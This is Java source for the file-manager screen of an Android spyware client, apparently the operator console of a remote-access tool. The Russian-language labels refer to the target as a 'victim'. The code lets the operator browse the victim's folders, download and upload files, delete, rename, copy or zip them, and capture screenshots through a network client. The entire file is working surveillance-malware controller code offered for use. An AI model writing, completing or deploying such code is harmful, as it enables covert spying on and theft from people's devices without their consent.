package slade.carter.spyclient;

import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.view.ContextMenu;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;

public class FileManagerActivity extends AppCompatActivity {

    private static FileManagerActivity _instanse;

    private String _victim;
    private TextView _fileTextView;
    private TextView _pathTextView;

    private Button _pasteButton;
    private Button _updateButton;
    private Button _backButton;

    private ListView _filesListView;
    private ArrayList<String> _dirList;
    //public boolean isClicked;

    private String _bufferPath; //для copy-paste файлов
    private String _bufferFile; //для copy-paste файлов

    public static FileManagerActivity getInstance() {
        return _instanse;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_file_manager);
        _instanse = this;

        _dirList = new ArrayList<String>();

        _victim = getIntent().getStringExtra("victim");
        send_getFiles();

        _fileTextView = (TextView) findViewById(R.id.filesTextView);
        _fileTextView.setText("Файлы жертвы " + _victim);
        _pathTextView = (TextView) findViewById(R.id.pathTextView);

        _pasteButton = (Button) findViewById(R.id.pasteButton);
        _updateButton = (Button) findViewById(R.id.updateButton);
        _backButton = (Button) findViewById(R.id.backButton);

        _filesListView = (ListView) findViewById(R.id.filesListView);
        initListeners();
        registerForContextMenu(_filesListView);
    }

    public void send_getFiles() {
        NettyClient.getInstance().sendGetFiles(_victim, genDir());
    }

    private void initListeners() {
        _pasteButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                pasteHandler();
            }
        });
        _updateButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                send_getFiles();
            }
        });
        _backButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (_dirList.size() == 0){
                    MainActivity.getInstance().showText("Это корневая папка!");
                    return;
                }
                removeLastFile();
                send_getFiles();
            }
        });
        _filesListView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                String dir = ((TextView) view).getText().toString();
                _dirList.add(dir);
                send_getFiles();
            }
        });
    }

    public void removeLastFile() {
        _dirList.remove(_dirList.size() - 1);
    }

    public void initFilesList(JSONArray files) {
        // TODO: 14.07.2017 добавить обработку недоступных директорий
        /*if (files[0].equals("not exists")) {
            Toast.makeText(this, "Неверная директория!", Toast.LENGTH_LONG).show();
            removeLastFile();
            return;
        }*/

        if (files.size() == 0) {
            Toast.makeText(this, "Папка пустая!", Toast.LENGTH_LONG).show();
        } else {
//            MainActivity.getInstance().showText("Файлы получены!");
        }
        _pathTextView.setText(genDir());
        _filesListView.setVisibility(View.VISIBLE);
        String[] fileList = new String[files.size()];
        for (int i = 0; i < files.size(); i++)
            fileList[i] = (String) files.get(i);
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, fileList);
        // присваиваем адаптер списку
        _filesListView.setAdapter(adapter);
    }

    public void initFileInfo(String victim, JSONObject info) {
        String fullPath = (String) info.get("fullPath");
        long size = (long) info.get("size");
        String lastModified = (String) info.get("lastModifiedTime");

        LayoutInflater layoutInflater = LayoutInflater.from(this);
        final View infoView = layoutInflater.inflate(R.layout.view_fileinfo, null);

        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setView(infoView);

        TextView fullPathTextView = (TextView) infoView.findViewById(R.id.fullPathTextView);
        TextView sizeTextView = (TextView) infoView.findViewById(R.id.sizeTextView);
        TextView lastModifedTextView = (TextView) infoView.findViewById(R.id.lastModifiedTextView);

        fullPathTextView.setText("Путь: " + fullPath);
        sizeTextView.setText("Размер: " + getPatternFileSize(size));
        lastModifedTextView.setText("Последнее изменение: " + lastModified);

        alertDialogBuilder.setCancelable(false);
        alertDialogBuilder.setPositiveButton("ОК", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });

        alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.cancel();
            }
        });

        alertDialogBuilder.create();
        alertDialogBuilder.show();
    }

    private String getPatternFileSize(long bytes) {
        String pattern = bytes + " байт";
        if (bytes >= 1024) pattern = (bytes / 1024) + " КБ";
        if (bytes >= 1024*1024) pattern = (bytes / (1024*1024)) + " МБ";
        return pattern;
    }

    public void clearBuffer() {
        _bufferPath = "";
        _bufferFile = "";
    }

    @Override
    public void onCreateContextMenu(ContextMenu menu, View v, ContextMenu.ContextMenuInfo menuInfo) {
        menu.add("Скачать");
        menu.add("Информация");
        menu.add("Сжать в ZIP");
        menu.add("Переименовать");
        menu.add("Скопировать");
        menu.add("Удалить");
    }

    FileOutputStream _fileOutputStream;
    @Override
    public boolean onContextItemSelected(MenuItem item) {
        AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo) item.getMenuInfo();
        final String path = genDir() + ((TextView)info.targetView).getText();

        NettyClient nettyClient = NettyClient.getInstance();

        String itemName = item.toString();
        switch (itemName) {
            case "Скачать":
                String filename = ((TextView)info.targetView).getText().toString();
                File file = new File(Config.DOWNLOAD_PATH + filename);
                if (file.exists()) {
                    MainActivity.getInstance().showText("Файл уже у Вас!");
                } else
                    nettyClient.sendStartDownloadFile(_victim, path, Config.DOWNLOAD_PATH);
                break;
            case "Информация":
                nettyClient.sendGetFileInfo(_victim, path);
                break;
            case "Сжать в ZIP":
                nettyClient.sendBuildZip(path, _victim);
                break;
            case "Переименовать":
                /* LayoutInflater – это класс, который умеет из содержимого layout-файла создать View-элемент.
                 * Метод который это делает называется inflate.
                */
                LayoutInflater layoutInflater = LayoutInflater.from(this);
                final View promptView2 = layoutInflater.inflate(R.layout.view_input, null);

                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setView(promptView2);

                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        EditText newNameEditText = (EditText) promptView2.findViewById(R.id.inputEditText);
                        String newName = newNameEditText.getText().toString();
                        if (newName.trim().isEmpty()) return;
                        String newPath = genDir() + newName;

                        NettyClient.getInstance().sendRenameFile(_victim, path, newPath);
                    }
                });

                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int x = 0;
                        dialog.cancel();
                    }
                });

                alertDialogBuilder.create();
                alertDialogBuilder.show();
                break;
            case "Скопировать":
                _bufferPath = path;
                _bufferFile = ((TextView)info.targetView).getText() + "";
                break;
            case "Удалить":
                nettyClient.sendDeleteFile(_victim, path);
                break;
        }

        return super.onContextItemSelected(item);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        menu.add("Создать папку");
        menu.add("Вставить");
        menu.add("Обновить");
        menu.add("Закачать");
        menu.add("Сохранить screen");
        menu.add("Назад");
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo) item.getMenuInfo();
        String itemName = item.toString();
        switch (itemName) {
            case "Создать папку":
                LayoutInflater layoutInflater = LayoutInflater.from(this);
                final View filenameView = layoutInflater.inflate(R.layout.view_input, null);

                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setView(filenameView);

                alertDialogBuilder.setCancelable(false);
                alertDialogBuilder.setPositiveButton("ГО", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        EditText newNameEditText = (EditText) filenameView.findViewById(R.id.inputEditText);
                        String newName = newNameEditText.getText().toString();
                        if (newName.trim().isEmpty()) return;
                        String newDir = genDir() + newName;
                        NettyClient.getInstance().sendMakeDir(_victim, newDir);
                    }
                });

                alertDialogBuilder.setNegativeButton("Отмена", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        int x = 0;
                        dialog.cancel();
                    }
                });

                alertDialogBuilder.create();
                alertDialogBuilder.show();
                break;
            case "Вставить":
                pasteHandler();
                break;
            case "Обновить":
                send_getFiles();
                break;
            case "Закачать":
                OpenFileDialog fileDialog = new OpenFileDialog(this, _victim, genDir());
                fileDialog.show();

                MainActivity.getInstance().showText("Выберите файл для выгрузки.");
                break;
            case "Сохранить screen":
                NettyClient.getInstance().sendTakeScreen(_victim, genDir());
                break;
            case "Назад":
                if (_dirList.size() == 0){
                    MainActivity.getInstance().showText("Это корневая папка!");
                    break;
                }

                removeLastFile();
                send_getFiles();
                break;
        }
        return true;
    }

    private void pasteHandler() {
        if (_bufferPath == null || _bufferPath.trim().isEmpty()) {
            MainActivity.getInstance().showText("Буффер пуст!");
            return;
        }

        if (_bufferFile == null || _bufferFile.trim().isEmpty()) {
            MainActivity.getInstance().showText("Буффер пуст!");
            return;
        }

        NettyClient.getInstance().sendCopyFile(_victim, _bufferPath, genDir()+_bufferFile);
    }

    private String genDir() {
        String path = "/";
        for (String dir : _dirList) {
            path += dir + "/";
        }
        return path;
    }
}
